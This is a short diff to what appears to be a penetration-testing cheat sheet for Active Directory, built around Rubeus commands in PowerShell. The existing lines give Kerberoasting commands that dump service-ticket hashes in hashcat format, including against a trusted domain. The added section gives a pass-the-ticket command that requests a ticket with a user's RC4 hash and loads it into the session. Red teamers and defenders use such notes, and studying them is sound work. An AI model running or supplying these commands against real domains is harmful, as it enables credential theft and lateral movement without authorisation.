@@ -19,3 +19,8 @@ Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat'
 ```powershell
 Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
 ```
+
+## Reqest and pass the ticket to the current session
+```powershell
+Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
+```
